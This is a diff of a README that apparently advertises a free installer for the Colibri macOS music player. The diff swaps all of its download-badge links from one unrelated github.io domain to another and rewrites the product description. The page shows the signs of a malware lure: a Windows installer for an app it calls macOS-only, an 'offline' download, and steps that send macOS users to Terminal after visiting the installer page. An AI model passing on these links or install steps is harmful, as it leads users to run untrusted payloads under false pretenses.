@@ -8,7 +8,7 @@
   <img src="https://img.shields.io/badge/Category-Music+Player-E63946?style=for-the-badge&logo=appstore" />
 </p>
 
-**💻 Colibri Music Player Free Installer** — Colibri is a free, minimal music player for macOS focused on a tiny, elegant always-on-top mini-player that stays visible while you work. Works without internet access, no account required. Full offline installation.
+**💻 Colibri Music Player Free Installer** — Colibri is a macOS music player designed for simplicity, offering a minimal interface that focuses on playback of local music libraries without unnecessary complexity. Works without internet access, no account required. Full offline installation.
 
 <p align="center">
   <img src="https://skillicons.dev/icons?i=windows" />
@@ -22,7 +22,7 @@
 
 <div align="center">
 
-[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -30,16 +30,16 @@
 
 ## 📖 About Colibri Music Player
 
-Colibri is a free, minimal music player for macOS focused on a tiny, elegant always-on-top mini-player that stays visible while you work. With a clean interface showing only essential controls and album art, Colibri respects screen space while keeping music controls accessible. It supports local music files and integrates with macOS media controls.
+Colibri is a macOS music player designed for simplicity, offering a minimal interface that focuses on playback of local music libraries without unnecessary complexity. A clean alternative for users frustrated by iTunes/Music app bloat.
 
 ---
 
 ## ❌ Problem: Colibri Music Player is hard to access
 
-- **macOS Only** — No Windows or cross-platform version
-- **Feature Minimalism** — By design, lacks library management, playlists, and advanced features
-- **Library Management** — No built-in music library organization
-- **Streaming Services** — No integration with Spotify, Apple Music, or streaming platforms
+- **macOS Only** — No Windows or Linux version
+- **Very Basic** — Extremely minimal feature set; no library management, no streaming
+- **Development Inactive** — Appears to have received no updates in several years
+- **Niche Appeal** — Ultra-minimal players appeal to a small subset of music listeners
 
 ---
 
@@ -61,9 +61,9 @@ Colibri is a free, minimal music player for macOS focused on a tiny, elegant alw
 
 <div align="center">
 
-[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://zenboulderagora.github.io/Windw/)
+[![Install for Windows](https://img.shields.io/badge/Install_for_Windows-0078D4?style=for-the-badge&logo=windows&logoColor=white)](https://yobowgileysb.github.io/WinDownload/)
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 </div>
 
@@ -81,7 +81,7 @@ Colibri is a free, minimal music player for macOS focused on a tiny, elegant alw
 
 <div align="center">
 
-[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
@@ -100,7 +100,7 @@ Colibri is a free, minimal music player for macOS focused on a tiny, elegant alw
 
 ## 🍎 macOS Installation
 
-[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://zenboulderagora.github.io/macdw/)
+[![Install for macOS](https://img.shields.io/badge/Install_for_macOS-000000?style=for-the-badge&logo=apple&logoColor=white)](https://yobowgileysb.github.io/MacDownload/)
 
 1. Click the badge above to open the macOS installer page
 2. Open **Terminal** (`⌘ + Space` → type Terminal → Enter)
@@ -121,11 +121,11 @@ Colibri is a free, minimal music player for macOS focused on a tiny, elegant alw
 
 ---
 
-**Colibri Music Player Free Installer** — Colibri is a free, minimal music player for macOS focused on a tiny, elegant always-on-top mini-player that stays visible while you work. Install without internet connection today!
+**Colibri Music Player Free Installer** — Colibri is a macOS music player designed for simplicity, offering a minimal interface that focuses on playback of local music libraries without unnecessary complexity. Install without internet connection today!
 
 <div align="center">
 
-[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://zenboulderagora.github.io/Windw/)
+[![⬇ Install Colibri Music Player](https://img.shields.io/badge/⬇_Install_Colibri+Music+Player-E63946?style=for-the-badge&logo=github)](https://yobowgileysb.github.io/WinDownload/)
 
 </div>
 
